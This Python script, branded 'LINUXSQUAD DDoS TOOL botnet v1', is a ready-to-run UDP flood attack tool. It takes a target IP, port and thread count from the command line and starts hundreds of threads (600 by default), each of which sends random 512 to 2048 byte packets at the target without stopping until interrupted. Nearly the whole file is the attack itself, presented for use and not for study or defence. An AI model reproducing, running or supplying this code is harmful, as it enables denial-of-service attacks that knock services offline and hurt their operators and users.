import sys
import socket
import threading
import random
import time
import os

os.system("clear")

print("\033[92m")
print("╔══════════════════════════════════════════════╗")
print("║          LINUXSQUAD DDoS TOOL                ║")
print("║               botnet v1                      ║")
print("╚══════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("\033[93mUsage: python ddos.py <IP> <PORT> [THREADS]\033[0m")
    print("Example: python ddos.py 192.168.1.1 80 600")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600

print(f"\033[91m[+] Attack starting → {target}:{port}\033[0m")
print(f"\033[92m[+] {threads} threads running... (Ctrl+C to stop)\033[0m")

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(random.randint(512, 2048))
            sock.sendto(payload, (target, port))
        except:
            pass

for _ in range(threads):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

try:
    while True:
        time.sleep(5)
except KeyboardInterrupt:
    print("\n\033[91m[-] Attack stopped.\033[0m")
